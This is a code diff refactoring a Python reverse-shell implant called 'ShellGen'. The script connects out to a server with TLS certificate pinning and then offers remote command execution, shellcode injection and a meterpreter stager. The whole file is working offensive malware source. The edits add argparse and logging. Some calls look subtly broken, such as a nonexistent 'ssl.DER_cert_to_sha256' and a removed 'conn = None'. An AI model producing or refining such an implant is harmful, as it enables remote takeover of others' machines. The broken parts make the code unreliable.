@@ -1,43 +1,43 @@
-import sys
-import hashlib
+import logging
+import argparse
+import socket
 import ssl
-import subprocess
 import shlex
 
 
 def interactive_shell(conn):
-    exit = False
     prompt = "[ShellGen]> "
-    while not exit:
-        conn.sendall(prompt.encode())
-        command = conn.recv(1024).decode().strip()
-        if len(command) > 1:
-            argv = shlex.split(command)
-            if argv[0] == "meterpreter":
-                if len(argv) > 2:
-                    transport = argv[1]
-                    address = argv[2]
-                    ok, err = meterpreter_meterpreter(transport, address)
-                    if not ok:
-                        conn.sendall((err + "\n").encode())
+    while True:
+        try:
+            conn.sendall(prompt.encode())
+            command = conn.recv(1024).decode().strip()
+            if len(command) > 1:
+                argv = shlex.split(command)
+                if argv[0] == "meterpreter":
+                    if len(argv) > 2:
+                        transport = argv[1]
+                        address = argv[2]
+                        ok, err = meterpreter_meterpreter(transport, address)
+                        if not ok:
+                            conn.sendall((err + "\n").encode())
+                    else:
+                        conn.sendall("Usage: meterpreter [tcp|http|https] IP:PORT\n".encode())
+                elif argv[0] == "inject":
+                    if len(argv) > 1:
+                        shellcode = argv[1]
+                        shellcode = bytes.fromhex(shellcode)
+                        shellcode_length = len(shellcode)
+                        if shellcode_length > 0:
+                            shell.InjectShellcode(shellcode)
+                elif argv[0] == "exit":
+                    break
+                elif argv[0] == "run_shell":
+                    conn.sendall("Here is your original shell: \n".encode())
+                    run_shell(conn)
                 else:
-                    conn.sendall("Usage: meterpreter [tcp|http|https] IP:PORT\n".encode())
-            elif argv[0] == "inject":
-                if len(argv) > 1:
-                    shellcode = argv[1]
-                    shellcode = bytes.fromhex(shellcode)
-                    shellcode_length = len(shellcode)
-                    if shellcode_length > 0:
-                        shell.InjectShellcode(shellcode)
-            elif argv[0] == "exit":
-                exit = True
-            elif argv[0] == "run_shell":
-                conn.sendall("Here is your original shell: \n".encode())
-                run_shell(conn)
-            else:
-                shell.ExecuteCmd(command, conn)
-        if exit:
-            break
+                    shell.ExecuteCmd(command, conn)
+        except Exception as e:
+            logging.error(f"Error while executing command: {e}")
 
 
 def run_shell(conn):
@@ -49,20 +49,18 @@ def run_shell(conn):
 
 
 def check_key_pin(conn, fingerprint):
-    valid = False
     try:
         cert = conn.getpeercert(binary_form=True)
         if cert:
-            cert_hash = hashlib.sha256(cert).digest()
+            cert_hash = ssl.DER_cert_to_sha256(cert)
             if cert_hash == fingerprint:
-                valid = True
-    except:
-        pass
-    return valid
+                return True
+    except Exception as e:
+        logging.error(f"Error while verifying fingerprint: {e}")
+    return False
 
 
 def reverse(connect_string, fingerprint):
-    conn = None
     try:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
@@ -72,16 +70,25 @@ def reverse(connect_string, fingerprint):
         if not check_key_pin(conn, fingerprint):
             raise Exception("Bad fingerprint")
         interactive_shell(conn)
-    except:
-        sys.exit(2)
+    except Exception as e:
+        logging.error(f"Error while connecting to server: {e}")
     finally:
         if conn:
             conn.close()
 
 
 if __name__ == "__main__":
-    connect_string = ""
-    fingerprint = ""
-    if connect_string and fingerprint:
-        fingerprint = bytes.fromhex(fingerprint.replace(':', ''))
-        reverse(connect_string, fingerprint)
+    # Parse command-line arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument("connect_string", help="server to connect to")
+    parser.add_argument("fingerprint", help="SSL/TLS certificate fingerprint")
+    args = parser.parse_args()
+
+    # Convert fingerprint to bytes
+    fingerprint_bytes = bytes.fromhex(args.fingerprint.replace(':', ''))
+
+    # Configure logging
+    logging.basicConfig(filename='shellgen.log', level=logging.DEBUG)
+
+    # Start reverse shell
+    reverse(args.connect_string, fingerprint_bytes)
